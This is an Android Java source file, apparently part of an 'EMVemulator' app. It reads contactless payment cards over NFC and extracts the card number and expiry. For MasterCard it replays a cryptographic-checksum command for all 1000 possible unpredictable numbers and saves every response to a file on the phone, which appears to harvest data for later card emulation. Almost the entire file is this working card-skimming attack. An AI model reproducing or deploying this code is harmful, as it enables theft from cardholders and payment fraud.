package com.android.EMVemulator;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.Intent;
import android.nfc.NfcAdapter;
import android.nfc.Tag;
import android.nfc.tech.IsoDep;
import android.nfc.tech.NfcA;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.util.Arrays;


public class MainActivity extends Activity {

    private NfcAdapter nfcAdapter;
    private Tag tag;
    private IsoDep tagcomm;
    private String[][] nfctechfilter = new String[][]{new String[]{NfcA.class.getName()}};
    private PendingIntent nfcintent;
    private TextView cardType;
    private TextView intro;
    private TextView progress;
    private TextView cardNumber;
    private TextView cardExipration;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        nfcAdapter = NfcAdapter.getDefaultAdapter(this);
        nfcintent = PendingIntent.getActivity(this, 0, new Intent(this, getClass()).addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP), 0);
        intro = (TextView) findViewById(R.id.intro);
        progress = (TextView) findViewById(R.id.progress);
        cardType = (TextView) findViewById(R.id.cardType);
        cardNumber = (TextView) findViewById(R.id.cardNumber);
        cardExipration = (TextView) findViewById(R.id.cardExipration);
    }

    @Override
    public void onResume() {
        super.onResume();
        //nfcAdapter.enableReaderMode(this, NfcAdapter.FLAG_READER_NFC_A | NfcAdapter.FLAG_READER_SKIP_NDEF_CHECK,null);
        nfcAdapter.enableForegroundDispatch(this, nfcintent, null, nfctechfilter);
    }

    @Override
    public void onPause() {
        super.onPause();
        nfcAdapter.disableReaderMode(this);
        //nfcAdapter.disableForegroundDispatch(this);
    }

    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        tag = intent.getParcelableExtra(NfcAdapter.EXTRA_TAG);
        Log.i("EMVemulator", "Tag detected");
        new CardReader().execute(tag);
    }

    private class CardReader extends AsyncTask<Tag, String, String> {
        String cardtype;
        String cardnumber;
        String cardexipration;
        String error;

        @Override
        protected String doInBackground(Tag... params) {
            Tag tag = params[0];
            tagcomm = IsoDep.get(tag);
            try {
                tagcomm.connect();
            } catch (IOException e) {
                Log.i("EMVemulator", "Error tagcomm");
                error = "Reading card data ... Error tagcomm";
                return null;
            }
            try {
                readCard();
                tagcomm.close();
            } catch (IOException e) {
                Log.i("EMVemulator", "Error tranceive");
                error = "Reading card data ... Error tranceive";
                return null;
            }
            return null;
        }

        private void readCard() {
            try {
                String temp;
                File myFile = new File("/storage/sdcard0/Download/card.txt");
                myFile.createNewFile();
                FileOutputStream fOut = new FileOutputStream(myFile);
                OutputStreamWriter myOutWriter = new OutputStreamWriter(fOut);
                byte[] recv = transceive("00 A4 04 00 0E 32 50 41 59 2E 53 59 53 2E 44 44 46 30 31 00");
                temp = "00 A4 04 00 07";
                temp += Byte2Hex(recv).substring(80, 102);
                temp += "00";
                if (temp.matches("00 A4 04 00 07 A0 00 00 00 04 10 10 00"))
                    cardtype = "MasterCard";
                if (temp.matches("00 A4 04 00 07 A0 00 00 00 03 20 10 00"))
                    cardtype = "Visa Electron";
                if (temp.matches("00 A4 04 00 07 A0 00 00 00 03 10 10 00"))
                    cardtype = "Visa";
                recv = transceive(temp);
                myOutWriter.append(Byte2Hex(recv) + "\n");
                //recv = transceive("80 A8 00 00 02 83 00 00"); ---- netreba staci tu odpoved napevno
                //recv = transceive("80 A8 00 00 05 04 06 04 02 00");
                //myOutWriter.append(Byte2Hex(recv)+"\n");
                myOutWriter.append(toMagStripeMode() + "\n");
                recv = transceive("00 B2 01 0C 00");
                myOutWriter.append(Byte2Hex(recv) + "\n");
                if (cardtype == "MasterCard") {
                    cardnumber = "Card number: " + new String(Arrays.copyOfRange(recv, 28, 44));
                    cardexipration = "Card expiration: " + new String(Arrays.copyOfRange(recv, 50, 52)) + "/" + new String(Arrays.copyOfRange(recv, 48, 50));

                    for (int i = 0; i < 1000; i++) {
                        recv = transceive("80 A8 00 00 02 83 00 00");
                        temp = "802A8E800400000";
                        temp += String.format("%03d", i);
                        temp += "00";
                        temp = temp.replaceAll("..(?!$)", "$0 ");
                        recv = transceive(temp);
                        myOutWriter.append(Byte2Hex(recv) + "\n");
                        if (i % 10 == 0) {
                            publishProgress(String.valueOf(i / 10));
                        }
                    }
                }
                if (cardtype == "Visa" || cardtype == "Visa Electron") {
                    cardnumber = "Card number: " + Byte2Hex(recv).substring(12, 36).replaceAll(" ", "");
                    cardexipration = "Card expiration: " + Byte2Hex(recv).substring(40, 43).replaceAll(" ", "") + "/" + Byte2Hex(recv).substring(37, 40).replaceAll(" ", "");
                }

                Log.i("EMVemulator", "Done!");
                myOutWriter.close();
                fOut.close();

            } catch (IOException e) {
                Log.i("EMVemulator", "Error readCard");
                error = "Reading card data ... Error readCard";
            }
        }


        protected byte[] transceive(String hexstr) throws IOException {
            String[] hexbytes = hexstr.split("\\s");
            byte[] bytes = new byte[hexbytes.length];
            for (int i = 0; i < hexbytes.length; i++) {
                bytes[i] = (byte) Integer.parseInt(hexbytes[i], 16);
            }
            Log.i("EMVemulator", "Send: " + Byte2Hex(bytes));
            byte[] recv = tagcomm.transceive(bytes);
            Log.i("EMVemulator", "Received: " + Byte2Hex(recv));
            return recv;
        }


        protected String Byte2Hex(byte[] input) {
            StringBuilder result = new StringBuilder();
            for (Byte inputbyte : input) {
                result.append(String.format("%02X" + " ", inputbyte));
            }
            return result.toString();
        }

        protected String toMagStripeMode() {
            return "770A820200009404080101009000";
        }

        protected void onProgressUpdate(String... percentage) {
            progress.setText("Reading card data ... " + percentage[0] + "%");
        }

        protected void onPreExecute() {
            intro.setText("Card detected!");
        }

        protected void onPostExecute(String result) {
            progress.setText("Reading card data ... completed");
            if (error != null)
                progress.setText(error);
            Toast.makeText(getApplicationContext(), "Done!", Toast.LENGTH_SHORT).show();
            cardType.setText(cardtype);
            cardNumber.setText(cardnumber);
            cardExipration.setText(cardexipration);
        }

    }

}
